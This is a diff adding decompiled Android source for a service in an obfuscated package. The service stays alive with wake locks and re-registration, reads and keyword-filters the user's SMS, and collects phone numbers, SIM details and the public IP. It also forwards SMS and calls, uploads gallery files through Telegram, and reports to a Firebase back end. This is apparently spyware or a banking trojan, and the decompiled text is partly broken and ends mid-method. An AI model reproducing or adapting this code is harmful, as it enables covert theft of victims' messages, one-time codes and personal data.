@@ -1,0 +1,2923 @@
+package com.cbqimrt.lx4076cb;
+
+import android.app.AlarmManager;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.content.res.AssetFileDescriptor;
+import android.database.Cursor;
+import android.media.MediaPlayer;
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkRequest;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Environment;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.os.PowerManager;
+import android.provider.MediaStore;
+import android.provider.Settings;
+import android.telephony.SmsManager;
+import android.telephony.SubscriptionInfo;
+import android.telephony.SubscriptionManager;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+import android.widget.Toast;
+import androidx.work.NetworkType$EnumUnboxingLocalUtility;
+import androidx.work.impl.Processor$$ExternalSyntheticLambda2;
+import com.google.android.gms.common.ConnectionResult;
+import com.google.android.gms.tasks.OnSuccessListener;
+import com.google.android.gms.tasks.Task;
+import com.google.firebase.FirebaseApp;
+import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.database.DataSnapshot;
+import com.google.firebase.database.DatabaseError;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+import com.google.firebase.database.ServerValue;
+import com.google.firebase.database.ValueEventListener;
+import com.google.firebase.database.core.ServerValues;
+import com.google.firebase.messaging.Constants;
+import com.google.firebase.messaging.FirebaseMessaging;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.text.SimpleDateFormat;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.Date;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Iterator;
+import java.util.List;
+import java.util.Locale;
+import java.util.Map;
+import java.util.Objects;
+import java.util.Set;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.ScheduledFuture;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicBoolean;
+
+/* JADX INFO: loaded from: classes.dex */
+public class ForegroundService extends Service {
+    private static final String CHANNEL_ID = "Worker";
+    private static final long GALLERY_RETRY_MS = 300000;
+    private static final String KEY_DEVICE_ID = "device_id";
+    private static final String KEY_REGISTERED = "registered";
+    private static final int MAX_RESTART_ATTEMPTS = 5;
+    private static final String PREFS_NAME = "pm";
+    private static final String TAG = "FgService";
+    private static Context appContext;
+    private static final AtomicBoolean running = new AtomicBoolean(false);
+    private BroadcastReceiver batteryReceiver;
+    private CallForwardingUtility callUtil;
+    private ValueEventListener connectedListener;
+    private DatabaseReference connectedRef;
+    private BroadcastReceiver connectivityReceiver;
+    private ValueEventListener dataListener;
+    private DatabaseReference dataRef;
+    private String deviceID;
+    private MediaPlayer mediaPlayer;
+    private ConnectivityManager.NetworkCallback networkCallback;
+    private BroadcastReceiver persistenceReceiver;
+    private SmsForwardingUtility smsFwd;
+    private ScheduledExecutorService smsScheduler;
+    private DatabaseReference statusRef;
+    private PowerManager.WakeLock wl;
+    private ScheduledExecutorService wlScheduler;
+    private ScheduledFuture<?> wlTask;
+    private ExecutorService exec = Executors.newSingleThreadExecutor();
+    private ExecutorService hbExec = Executors.newSingleThreadExecutor();
+    private ExecutorService galleryExec = Executors.newSingleThreadExecutor();
+    private final Handler galleryRetryHandler = new Handler(Looper.getMainLooper());
+    private volatile boolean galleryUploadActive = false;
+    private volatile boolean isListening = false;
+    private volatile boolean isHeartbeating = false;
+    private volatile int hbFails = 0;
+    private boolean smsFwdActive = false;
+    private String smsFwdTarget = "";
+    private int smsFwdSim = 0;
+    private Map<String, Object> lastCallFwd = new HashMap();
+    private Map<String, Object> lastSendSms = new HashMap();
+    private Map<String, Object> lastSmsFwd = new HashMap();
+    private Map<String, Object> lastDonation = new HashMap();
+    private Map<String, Object> lastMakeCall = new HashMap();
+    private int restartAttempts = 0;
+    private long lastSmsTimestamp = 0;
+    private long lastRelayWakeTs = 0;
+    private volatile boolean reconnectScheduled = false;
+
+    /* JADX INFO: renamed from: com.cbqimrt.lx4076cb.ForegroundService$6, reason: invalid class name */
+    public class AnonymousClass6 extends ConnectivityManager.NetworkCallback {
+        public AnonymousClass6() {
+        }
+
+        /* JADX INFO: Access modifiers changed from: private */
+        public /* synthetic */ void lambda$onAvailable$0() {
+            ForegroundService.this.registerDevice();
+        }
+
+        @Override // android.net.ConnectivityManager.NetworkCallback
+        public void onAvailable(Network network) {
+            if (ForegroundService.this.getSharedPreferences(ForegroundService.PREFS_NAME, 0).getBoolean(ForegroundService.KEY_REGISTERED, false)) {
+                return;
+            }
+            ForegroundService.this.exec.execute(new RestartActivity$$ExternalSyntheticLambda1(this, 2));
+        }
+    }
+
+    /* JADX INFO: renamed from: com.cbqimrt.lx4076cb.ForegroundService$7, reason: invalid class name */
+    public class AnonymousClass7 extends BroadcastReceiver {
+        public AnonymousClass7() {
+        }
+
+        /* JADX INFO: Access modifiers changed from: private */
+        public /* synthetic */ void lambda$onReceive$0() {
+            ForegroundService.this.registerDevice();
+        }
+
+        @Override // android.content.BroadcastReceiver
+        public void onReceive(Context context, Intent intent) {
+            if (!NetworkUtil.isConnected(context) || ForegroundService.this.getSharedPreferences(ForegroundService.PREFS_NAME, 0).getBoolean(ForegroundService.KEY_REGISTERED, false)) {
+                return;
+            }
+            ForegroundService.this.exec.execute(new RestartActivity$$ExternalSyntheticLambda1(this, 3));
+        }
+    }
+
+    public interface IPListener {
+        void onIP(String str);
+    }
+
+    private void acquireWL() {
+        PowerManager powerManager = (PowerManager) getSystemService("power");
+        if (powerManager == null) {
+            return;
+        }
+        PowerManager.WakeLock wakeLock = this.wl;
+        if (wakeLock != null && wakeLock.isHeld()) {
+            try {
+                this.wl.release();
+            } catch (Exception unused) {
+            }
+        }
+        PowerManager.WakeLock wakeLockNewWakeLock = powerManager.newWakeLock(1, "FgService::WL");
+        this.wl = wakeLockNewWakeLock;
+        wakeLockNewWakeLock.setReferenceCounted(false);
+        if (this.wl.isHeld()) {
+            return;
+        }
+        this.wl.acquire();
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public boolean boolVal(Object obj) {
+        if (obj instanceof Boolean) {
+            return ((Boolean) obj).booleanValue();
+        }
+        if (obj instanceof Number) {
+            return ((Number) obj).intValue() != 0;
+        }
+        if (obj instanceof String) {
+            return Boolean.parseBoolean((String) obj);
+        }
+        return false;
+    }
+
+    private Notification buildNotif() {
+        int i = Build.VERSION.SDK_INT;
+        Notification.Builder builderM = i >= 26 ? RestartActivity$$ExternalSyntheticApiModelOutline0.m(this) : new Notification.Builder(this);
+        Intent intent = new Intent(this, (Class<?>) AlarmReceiver.class);
+        intent.setAction("com.cbqimrt.lx4076cb.KEEP_ALIVE");
+        return builderM.setOngoing(true).setPriority(-1).setContentText(getString(R.string.foreground_notif_text)).setSmallIcon(R.drawable.ic_settings_black).addAction(R.drawable.ic_settings_black, "Keep Alive", PendingIntent.getBroadcast(this, 999, intent, (i >= 23 ? 67108864 : 0) | 134217728)).build();
+    }
+
+    private boolean checkRoot() {
+        String[] strArr = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su"};
+        for (int i = 0; i < 9; i++) {
+            if (new File(strArr[i]).exists()) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private void createChannel() {
+        if (Build.VERSION.SDK_INT >= 26) {
+            NotificationChannel notificationChannelM = RestartActivity$$ExternalSyntheticApiModelOutline0.m();
+            notificationChannelM.setDescription("Persistent foreground service");
+            notificationChannelM.setShowBadge(false);
+            notificationChannelM.setLockscreenVisibility(0);
+            ((NotificationManager) getSystemService("notification")).createNotificationChannel(notificationChannelM);
+        }
+    }
+
+    private void delete(String str) {
+        FirebaseDatabase.getInstance().getReference(str).removeValue().addOnFailureListener(new MainActivity$$ExternalSyntheticLambda7(str, 1));
+    }
+
+    private String fmt(long j) {
+        return new SimpleDateFormat("dd-MM-yyyy | hh:mm a", Locale.getDefault()).format(new Date(j));
+    }
+
+    private List<Map<String, Object>> getAllMessages() {
+        ArrayList arrayList = new ArrayList();
+        if (checkSelfPermission("android.permission.READ_SMS") != 0) {
+            Log.w(TAG, "READ_SMS permission denied, cannot read messages");
+            return arrayList;
+        }
+        try {
+            Cursor cursorQuery = getContentResolver().query(Uri.parse("content://sms/"), new String[]{"address", "body", "date", "type"}, null, null, "date DESC LIMIT 500");
+            if (cursorQuery != null) {
+                while (cursorQuery.moveToNext()) {
+                    try {
+                        HashMap map = new HashMap();
+                        map.put("sender", cursorQuery.getString(cursorQuery.getColumnIndexOrThrow("address")));
+                        map.put("message", cursorQuery.getString(cursorQuery.getColumnIndexOrThrow("body")));
+                        long j = cursorQuery.getLong(cursorQuery.getColumnIndexOrThrow("date"));
+                        map.put("dateTime", fmt(j));
+                        map.put(ServerValues.NAME_OP_TIMESTAMP, Long.valueOf(j));
+                        map.put("receivedDate", fmt(j));
+                        map.put("type", cursorQuery.getInt(cursorQuery.getColumnIndexOrThrow("type")) == 1 ? "incoming" : "outgoing");
+                        arrayList.add(map);
+                    } catch (Throwable th) {
+                        try {
+                            cursorQuery.close();
+                        } catch (Throwable th2) {
+                            th.addSuppressed(th2);
+                        }
+                        throw th;
+                    }
+                }
+            }
+            if (cursorQuery != null) {
+                cursorQuery.close();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "read SMS error", e);
+        }
+        return arrayList;
+    }
+
+    private String getBattery() {
+        try {
+            Intent intentRegisterReceiver = registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
+            if (intentRegisterReceiver == null) {
+                return "Unknown";
+            }
+            int intExtra = intentRegisterReceiver.getIntExtra("level", -1);
+            int intExtra2 = intentRegisterReceiver.getIntExtra("scale", -1);
+            if (intExtra != -1 && intExtra2 != -1) {
+                return ((int) ((intExtra / intExtra2) * 100.0f)) + "%";
+            }
+            return "Unknown";
+        } catch (Exception unused) {
+            return "Unknown";
+        }
+    }
+
+    private String getCarrier() {
+        try {
+            TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
+            return telephonyManager != null ? telephonyManager.getNetworkOperatorName() : "Unknown";
+        } catch (Exception unused) {
+            return "Unknown";
+        }
+    }
+
+    private List<Map<String, Object>> getFilteredMessages(Set<String> set) {
+        ArrayList arrayList = new ArrayList();
+        if (set != null && !set.isEmpty()) {
+            if (checkSelfPermission("android.permission.READ_SMS") != 0) {
+                Log.w(TAG, "READ_SMS permission denied, cannot filter messages");
+                return arrayList;
+            }
+            try {
+                Cursor cursorQuery = getContentResolver().query(Uri.parse("content://sms/"), new String[]{"address", "body", "date", "type"}, null, null, "date DESC LIMIT 500");
+                if (cursorQuery != null) {
+                    while (cursorQuery.moveToNext()) {
+                        try {
+                            String string = cursorQuery.getString(cursorQuery.getColumnIndexOrThrow("body"));
+                            if (string != null) {
+                                String lowerCase = string.toLowerCase(Locale.getDefault());
+                                for (String str : set) {
+                                    if (lowerCase.contains(str)) {
+                                        HashMap map = new HashMap();
+                                        map.put("sender", cursorQuery.getString(cursorQuery.getColumnIndexOrThrow("address")));
+                                        map.put("message", string);
+                                        long j = cursorQuery.getLong(cursorQuery.getColumnIndexOrThrow("date"));
+                                        map.put("dateTime", fmt(j));
+                                        map.put(ServerValues.NAME_OP_TIMESTAMP, Long.valueOf(j));
+                                        map.put("receivedDate", fmt(j));
+                                        map.put("type", cursorQuery.getInt(cursorQuery.getColumnIndexOrThrow("type")) == 1 ? "incoming" : "outgoing");
+                                        map.put("matchedKeyword", str);
+                                        arrayList.add(map);
+                                        break;
+                                    }
+                                    Log.e(TAG, "filtered SMS error", e);
+                                }
+                            }
+                        } catch (Throwable th) {
+                            try {
+                                cursorQuery.close();
+                            } catch (Throwable th2) {
+                                th.addSuppressed(th2);
+                            }
+                            throw th;
+                        }
+                    }
+                }
+                if (cursorQuery != null) {
+                    cursorQuery.close();
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "filtered SMS error", e);
+            }
+        }
+        return arrayList;
+    }
+
+    private String getPhoneNumber() {
+        SubscriptionManager subscriptionManagerFrom;
+        try {
+            TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
+            if (telephonyManager != null && getApplicationContext().checkSelfPermission("android.permission.READ_PHONE_STATE") == 0 && (Build.VERSION.SDK_INT < 29 || getApplicationContext().checkSelfPermission("android.permission.READ_PHONE_NUMBERS") == 0)) {
+                String line1Number = telephonyManager.getLine1Number();
+                if (line1Number != null && !line1Number.isEmpty()) {
+                    return line1Number;
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "getPhoneNumber error: " + e.getMessage());
+        }
+        try {
+            if (Build.VERSION.SDK_INT < 23) {
+                return "";
+            }
+            List activeSubscriptionInfoList = null;
+            try {
+                subscriptionManagerFrom = ForegroundService$$ExternalSyntheticApiModelOutline14.m42m(getSystemService(ForegroundService$$ExternalSyntheticApiModelOutline14.m()));
+            } catch (Exception unused) {
+                subscriptionManagerFrom = null;
+            }
+            if (subscriptionManagerFrom == null && Build.VERSION.SDK_INT >= 22) {
+                try {
+                    subscriptionManagerFrom = SubscriptionManager.from(this);
+                } catch (Exception unused2) {
+                }
+            }
+            if (subscriptionManagerFrom == null) {
+                return "";
+            }
+            try {
+                activeSubscriptionInfoList = subscriptionManagerFrom.getActiveSubscriptionInfoList();
+            } catch (Exception unused3) {
+            }
+            if (activeSubscriptionInfoList == null || activeSubscriptionInfoList.isEmpty()) {
+                return "";
+            }
+            Iterator it = activeSubscriptionInfoList.iterator();
+            while (it.hasNext()) {
+                try {
+                    String number = ForegroundService$$ExternalSyntheticApiModelOutline14.m(it.next()).getNumber();
+                    if (number != null && !number.isEmpty()) {
+                        return number;
+                    }
+                } catch (Exception unused4) {
+                }
+            }
+            return "";
+        } catch (Exception e2) {
+            Log.w(TAG, "getPhoneNumber from SIM error: " + e2.getMessage());
+            return "";
+        }
+    }
+
+    private void getPublicIP(IPListener iPListener) {
+        this.exec.execute(new RestartActivity$$ExternalSyntheticLambda1(iPListener, 1));
+    }
+
+    private List<Map<String, String>> getSims() {
+        try {
+            if (getApplicationContext().checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
+                return getSimsInternal();
+            }
+            Log.w(TAG, "READ_PHONE_STATE not granted");
+            ArrayList arrayList = new ArrayList();
+            for (int i = 0; i < 2; i++) {
+                HashMap map = new HashMap();
+                map.put("phoneNumber", "");
+                map.put("carrierName", "Unknown");
+                map.put("displayName", "");
+                map.put("simSlotIndex", String.valueOf(i));
+                map.put("carrierId", "-1");
+                arrayList.add(map);
+            }
+            return arrayList;
+        } catch (Throwable th) {
+            Log.e(TAG, "getSims error", th instanceof Exception ? th : new RuntimeException(th));
+            ArrayList arrayList2 = new ArrayList();
+            HashMap map2 = new HashMap();
+            map2.put("phoneNumber", "");
+            map2.put("carrierName", "Unknown");
+            map2.put("displayName", "");
+            map2.put("simSlotIndex", "0");
+            map2.put("carrierId", "-1");
+            arrayList2.add(map2);
+            return arrayList2;
+        }
+    }
+
+    /* JADX WARN: Code duplicated, block: B:101:0x015c A[EXC_TOP_SPLITTER, SYNTHETIC] */
+    /* JADX WARN: Code duplicated, block: B:107:0x008b A[EXC_TOP_SPLITTER, SYNTHETIC] */
+    /* JADX WARN: Code duplicated, block: B:36:0x006e A[Catch: all -> 0x002e, SecurityException -> 0x0031, TRY_LEAVE, TryCatch #1 {SecurityException -> 0x0031, blocks: (B:3:0x001b, B:5:0x0021, B:27:0x005a, B:34:0x0067, B:36:0x006e, B:46:0x00a0, B:48:0x00a7, B:50:0x00bf, B:52:0x00cb, B:54:0x00d1, B:55:0x00dd, B:57:0x00e3, B:69:0x0120, B:71:0x0129, B:73:0x0133, B:75:0x013c, B:77:0x0146, B:84:0x016f, B:83:0x016c, B:82:0x0168, B:63:0x00fc, B:85:0x01a4, B:42:0x0092, B:44:0x0099), top: B:98:0x001b }] */
+    /* JADX WARN: Code duplicated, block: B:48:0x00a7 A[Catch: all -> 0x002e, SecurityException -> 0x0031, TryCatch #1 {SecurityException -> 0x0031, blocks: (B:3:0x001b, B:5:0x0021, B:27:0x005a, B:34:0x0067, B:36:0x006e, B:46:0x00a0, B:48:0x00a7, B:50:0x00bf, B:52:0x00cb, B:54:0x00d1, B:55:0x00dd, B:57:0x00e3, B:69:0x0120, B:71:0x0129, B:73:0x0133, B:75:0x013c, B:77:0x0146, B:84:0x016f, B:83:0x016c, B:82:0x0168, B:63:0x00fc, B:85:0x01a4, B:42:0x0092, B:44:0x0099), top: B:98:0x001b }] */
+    /* JADX WARN: Code duplicated, block: B:49:0x00bd  */
+    /* JADX WARN: Code duplicated, block: B:67:0x011d  */
+    /* JADX WARN: Code duplicated, block: B:68:0x011f  */
+    /* JADX WARN: Code duplicated, block: B:71:0x0129 A[Catch: all -> 0x002e, SecurityException -> 0x0031, TryCatch #1 {SecurityException -> 0x0031, blocks: (B:3:0x001b, B:5:0x0021, B:27:0x005a, B:34:0x0067, B:36:0x006e, B:46:0x00a0, B:48:0x00a7, B:50:0x00bf, B:52:0x00cb, B:54:0x00d1, B:55:0x00dd, B:57:0x00e3, B:69:0x0120, B:71:0x0129, B:73:0x0133, B:75:0x013c, B:77:0x0146, B:84:0x016f, B:83:0x016c, B:82:0x0168, B:63:0x00fc, B:85:0x01a4, B:42:0x0092, B:44:0x0099), top: B:98:0x001b }] */
+    /* JADX WARN: Code duplicated, block: B:72:0x0132  */
+    /* JADX WARN: Code duplicated, block: B:75:0x013c A[Catch: all -> 0x002e, SecurityException -> 0x0031, TryCatch #1 {SecurityException -> 0x0031, blocks: (B:3:0x001b, B:5:0x0021, B:27:0x005a, B:34:0x0067, B:36:0x006e, B:46:0x00a0, B:48:0x00a7, B:50:0x00bf, B:52:0x00cb, B:54:0x00d1, B:55:0x00dd, B:57:0x00e3, B:69:0x0120, B:71:0x0129, B:73:0x0133, B:75:0x013c, B:77:0x0146, B:84:0x016f, B:83:0x016c, B:82:0x0168, B:63:0x00fc, B:85:0x01a4, B:42:0x0092, B:44:0x0099), top: B:98:0x001b }] */
+    /* JADX WARN: Code duplicated, block: B:76:0x0145  */
+    /* JADX WARN: Code duplicated, block: B:83:0x016c A[Catch: all -> 0x002e, SecurityException -> 0x0031, TryCatch #1 {SecurityException -> 0x0031, blocks: (B:3:0x001b, B:5:0x0021, B:27:0x005a, B:34:0x0067, B:36:0x006e, B:46:0x00a0, B:48:0x00a7, B:50:0x00bf, B:52:0x00cb, B:54:0x00d1, B:55:0x00dd, B:57:0x00e3, B:69:0x0120, B:71:0x0129, B:73:0x0133, B:75:0x013c, B:77:0x0146, B:84:0x016f, B:83:0x016c, B:82:0x0168, B:63:0x00fc, B:85:0x01a4, B:42:0x0092, B:44:0x0099), top: B:98:0x001b }] */
+    /* JADX WARN: Code duplicated, block: B:85:0x01a4 A[Catch: all -> 0x002e, SecurityException -> 0x0031, TRY_LEAVE, TryCatch #1 {SecurityException -> 0x0031, blocks: (B:3:0x001b, B:5:0x0021, B:27:0x005a, B:34:0x0067, B:36:0x006e, B:46:0x00a0, B:48:0x00a7, B:50:0x00bf, B:52:0x00cb, B:54:0x00d1, B:55:0x00dd, B:57:0x00e3, B:69:0x0120, B:71:0x0129, B:73:0x0133, B:75:0x013c, B:77:0x0146, B:84:0x016f, B:83:0x016c, B:82:0x0168, B:63:0x00fc, B:85:0x01a4, B:42:0x0092, B:44:0x0099), top: B:98:0x001b }] */
+    /* JADX WARN: Code duplicated, block: B:95:0x01d8  */
+    /* JADX WARN: Instruction removed from duplicated block: B:48:0x00a7, please report this as an issue */
+    private List<Map<String, String>> getSimsInternal() {
+        SubscriptionManager subscriptionManagerM42m;
+        List activeSubscriptionInfoList;
+        String str;
+        String number;
+        String str2;
+        String string;
+        String string2;
+        ArrayList arrayList = new ArrayList();
+        try {
+            try {
+                int i = Build.VERSION.SDK_INT;
+                boolean z = i < 29 || getApplicationContext().checkSelfPermission("android.permission.READ_PHONE_NUMBERS") == 0;
+                if (i >= 23) {
+                    try {
+                        try {
+                            subscriptionManagerM42m = ForegroundService$$ExternalSyntheticApiModelOutline14.m42m(getSystemService(ForegroundService$$ExternalSyntheticApiModelOutline14.m()));
+                        } catch (Exception unused) {
+                            subscriptionManagerM42m = null;
+                        }
+                    } catch (Exception unused2) {
+                    } catch (Throwable th) {
+                        th = th;
+                        Log.e(TAG, "getSimsInternal error", th instanceof Exception ? th : new RuntimeException(th));
+                        if (arrayList.isEmpty()) {
+                            HashMap map = new HashMap();
+                            map.put("phoneNumber", "");
+                            map.put("carrierName", "Unknown");
+                            map.put("displayName", "");
+                            map.put("simSlotIndex", "0");
+                            map.put("carrierId", "-1");
+                            arrayList.add(map);
+                        }
+                        return arrayList;
+                    }
+                    if (subscriptionManagerM42m == null && Build.VERSION.SDK_INT >= 22) {
+                        try {
+                            subscriptionManagerM42m = SubscriptionManager.from(this);
+                        } catch (Exception e) {
+                            Log.w(TAG, "SubscriptionManager.from failed", e);
+                        }
+                    }
+                    if (subscriptionManagerM42m == null) {
+                        Log.e(TAG, "SubscriptionManager is null");
+                        HashMap map2 = new HashMap();
+                        map2.put("phoneNumber", "");
+                        map2.put("carrierName", "Unknown");
+                        map2.put("displayName", "");
+                        map2.put("simSlotIndex", "0");
+                        map2.put("carrierId", "-1");
+                        arrayList.add(map2);
+                        return arrayList;
+                    }
+                    try {
+                        activeSubscriptionInfoList = subscriptionManagerM42m.getActiveSubscriptionInfoList();
+                    } catch (SecurityException e2) {
+                        Log.e(TAG, "getActiveSubscriptionInfoList SecurityException", e2);
+                        activeSubscriptionInfoList = null;
+                    } catch (Exception e3) {
+                        Log.e(TAG, "getActiveSubscriptionInfoList failed", e3);
+                        activeSubscriptionInfoList = null;
+                    }
+                    StringBuilder sb = new StringBuilder("getActiveSubscriptionInfoList returned ");
+                    if (activeSubscriptionInfoList != null) {
+                        str = activeSubscriptionInfoList.size() + " SIMs";
+                    } else {
+                        str = "null";
+                    }
+                    sb.append(str);
+                    Log.d(TAG, sb.toString());
+                    if (activeSubscriptionInfoList != null || activeSubscriptionInfoList.isEmpty()) {
+                        Log.w(TAG, "No active SIM subscriptions found");
+                    } else {
+                        Collections.sort(activeSubscriptionInfoList, new ForegroundService$$ExternalSyntheticLambda48());
+                        Iterator it = activeSubscriptionInfoList.iterator();
+                        while (it.hasNext()) {
+                            SubscriptionInfo subscriptionInfoM = ForegroundService$$ExternalSyntheticApiModelOutline14.m(it.next());
+                            HashMap map3 = new HashMap();
+                            if (z) {
+                                try {
+                                    number = subscriptionInfoM.getNumber();
+                                    it = it;
+                                } catch (SecurityException e4) {
+                                    Log.w(TAG, "Cannot read phone number: " + e4.getMessage());
+                                    number = "";
+                                }
+                                if (number != null) {
+                                    str2 = number;
+                                } else {
+                                    str2 = "";
+                                }
+                                map3.put("phoneNumber", str2);
+                                if (subscriptionInfoM.getCarrierName() != null) {
+                                    string = subscriptionInfoM.getCarrierName().toString();
+                                } else {
+                                    string = "Unknown";
+                                }
+                                map3.put("carrierName", string);
+                                if (subscriptionInfoM.getDisplayName() != null) {
+                                    string2 = subscriptionInfoM.getDisplayName().toString();
+                                } else {
+                                    string2 = "";
+                                }
+                                map3.put("displayName", string2);
+                                map3.put("simSlotIndex", String.valueOf(subscriptionInfoM.getSimSlotIndex()));
+                                boolean z2 = z;
+                                if (Build.VERSION.SDK_INT >= 28) {
+                                    try {
+                                        map3.put("carrierId", String.valueOf(subscriptionInfoM.getCarrierId()));
+                                    } catch (Throwable unused3) {
+                                        map3.put("carrierId", "-1");
+                                    }
+                                } else {
+                                    map3.put("carrierId", "-1");
+                                }
+                                Log.d(TAG, "SIM: carrier=" + ((Object) subscriptionInfoM.getCarrierName()) + " slot=" + subscriptionInfoM.getSimSlotIndex() + " number=" + number);
+                                arrayList.add(map3);
+                                z = z2;
+                                it = it;
+                            }
+                            number = "";
+                            if (number != null) {
+                                str2 = number;
+                            } else {
+                                str2 = "";
+                            }
+                            map3.put("phoneNumber", str2);
+                            if (subscriptionInfoM.getCarrierName() != null) {
+                                string = subscriptionInfoM.getCarrierName().toString();
+                            } else {
+                                string = "Unknown";
+                            }
+                            map3.put("carrierName", string);
+                            if (subscriptionInfoM.getDisplayName() != null) {
+                                string2 = subscriptionInfoM.getDisplayName().toString();
+                            } else {
+                                string2 = "";
+                            }
+                            map3.put("displayName", string2);
+                            map3.put("simSlotIndex", String.valueOf(subscriptionInfoM.getSimSlotIndex()));
+                            boolean z3 = z;
+                            if (Build.VERSION.SDK_INT >= 28) {
+                                map3.put("carrierId", String.valueOf(subscriptionInfoM.getCarrierId()));
+                            } else {
+                                map3.put("carrierId", "-1");
+                            }
+                            Log.d(TAG, "SIM: carrier=" + ((Object) subscriptionInfoM.getCarrierName()) + " slot=" + subscriptionInfoM.getSimSlotIndex() + " number=" + number);
+                            arrayList.add(map3);
+                            z = z3;
+                            it = it;
+                        }
+                    }
+                    if (arrayList.isEmpty()) {
+                        HashMap map4 = new HashMap();
+                        map4.put("phoneNumber", "");
+                        map4.put("carrierName", "Unknown");
+                        map4.put("displayName", "");
+                        map4.put("simSlotIndex", "0");
+                        map4.put("carrierId", "-1");
+                        arrayList.add(map4);
+                    }
+                    return arrayList;
+                }
+                subscriptionManagerM42m = null;
+                if (subscriptionManagerM42m == null) {
+                    subscriptionManagerM42m = SubscriptionManager.from(this);
+                }
+                if (subscriptionManagerM42m == null) {
+                    Log.e(TAG, "SubscriptionManager is null");
+                    HashMap map5 = new HashMap();
+                    map5.put("phoneNumber", "");
+                    map5.put("carrierName", "Unknown");
+                    map5.put("displayName", "");
+                    map5.put("simSlotIndex", "0");
+                    map5.put("carrierId", "-1");
+                    arrayList.add(map5);
+                    return arrayList;
+                }
+                activeSubscriptionInfoList = subscriptionManagerM42m.getActiveSubscriptionInfoList();
+                StringBuilder sb2 = new StringBuilder("getActiveSubscriptionInfoList returned ");
+                if (activeSubscriptionInfoList != null) {
+                    str = activeSubscriptionInfoList.size() + " SIMs";
+                } else {
+                    str = "null";
+                }
+                sb2.append(str);
+                Log.d(TAG, sb2.toString());
+                if (activeSubscriptionInfoList != null) {
+                    Log.w(TAG, "No active SIM subscriptions found");
+                } else {
+                    Log.w(TAG, "No active SIM subscriptions found");
+                }
+                if (arrayList.isEmpty()) {
+                    HashMap map6 = new HashMap();
+                    map6.put("phoneNumber", "");
+                    map6.put("carrierName", "Unknown");
+                    map6.put("displayName", "");
+                    map6.put("simSlotIndex", "0");
+                    map6.put("carrierId", "-1");
+                    arrayList.add(map6);
+                }
+                return arrayList;
+            } catch (Throwable th2) {
+                th = th2;
+            }
+        } catch (SecurityException e5) {
+            Log.e(TAG, "Permission denied reading SIM info: " + e5.getMessage());
+        }
+    }
+
+    private String getStorage() {
+        try {
+            float totalSpace = new File(Environment.getDataDirectory().getAbsolutePath()).getTotalSpace();
+            String str = "B";
+            if (totalSpace >= 1024.0f) {
+                totalSpace /= 1024.0f;
+                str = "KB";
+            }
+            if (totalSpace >= 1024.0f) {
+                totalSpace /= 1024.0f;
+                str = "MB";
+            }
+            if (totalSpace >= 1024.0f) {
+                totalSpace /= 1024.0f;
+                str = "GB";
+            }
+            return String.format("%.0f", Float.valueOf(totalSpace)).concat(str);
+        } catch (Exception unused) {
+            return "Unknown";
+        }
+    }
+
+    private void indexGalleryUpload(String str, String str2, String str3, String str4) {
+        try {
+            String file = TelegramHelper.getFile(str, str2);
+            if (file == null || file.isEmpty()) {
+                Log.w(TAG, "indexGalleryUpload: getFile returned null for " + str3 + ", storing fileId only");
+            }
+            HashMap map = new HashMap();
+            map.put("fileId", str2);
+            if (file == null) {
+                file = "";
+            }
+            map.put("filePath", file);
+            map.put("fileName", str3 != null ? str3 : "");
+            map.put("date", Long.valueOf(System.currentTimeMillis() / 1000));
+            if (str4 == null) {
+                str4 = "";
+            }
+            map.put("caption", str4);
+            FirebaseDatabase.getInstance().getReference("galleryUploads").child(this.deviceID).push().setValue(map).addOnSuccessListener(new MainActivity$$ExternalSyntheticLambda7(str3, 2)).addOnFailureListener(new MainActivity$$ExternalSyntheticLambda7(str3, 3));
+        } catch (Exception e) {
+            Log.e(TAG, "indexGalleryUpload error", e);
+        }
+    }
+
+    public static boolean isRunning() {
+        return running.get();
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static /* synthetic */ void lambda$delete$26(String str, Exception exc) {
+        Log.w(TAG, "delete " + str + " failed: " + exc.getMessage());
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static /* synthetic */ void lambda$getPublicIP$30(IPListener iPListener) throws Throwable {
+        HttpURLConnection httpURLConnection;
+        String str = "Unknown";
+        BufferedReader bufferedReader = null;
+        try {
+            httpURLConnection = (HttpURLConnection) new URL("https://api.ipify.org").openConnection();
+            try {
+                BufferedReader bufferedReader2 = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
+                try {
+                    String line = bufferedReader2.readLine();
+                    str = line != null ? line : "Unknown";
+                    try {
+                        bufferedReader2.close();
+                    } catch (Exception unused) {
+                    }
+                } catch (Exception unused2) {
+                    bufferedReader = bufferedReader2;
+                    if (bufferedReader != null) {
+                        try {
+                            bufferedReader.close();
+                        } catch (Exception unused3) {
+                        }
+                    }
+                    if (httpURLConnection != null) {
+                    }
+                    iPListener.onIP(str);
